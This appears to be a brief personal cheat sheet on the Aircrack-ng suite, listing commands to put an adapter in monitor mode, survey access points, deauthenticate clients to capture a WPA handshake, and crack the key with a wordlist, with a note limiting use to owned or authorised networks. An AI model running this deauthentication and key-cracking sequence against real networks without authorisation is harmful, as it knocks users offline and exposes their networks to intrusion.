---
tags: [tools,aircrack,wireless]
---

# Aircrack-ng Suite
Wi-Fi auditing (your Alfa adapter). **Own/authorized networks only.**
```
airmon-ng start wlan0                 # monitor mode
airodump-ng wlan0mon                  # survey APs/clients
airodump-ng -c 6 --bssid AA:.. -w cap wlan0mon   # target + capture handshake
aireplay-ng --deauth 5 -a AA:.. wlan0mon         # force reconnect (capture handshake)
aircrack-ng -w rockyou.txt cap-01.cap            # crack PSK
```
See [[EAPOL Handshakes]], [[WPA2-WPA3]].
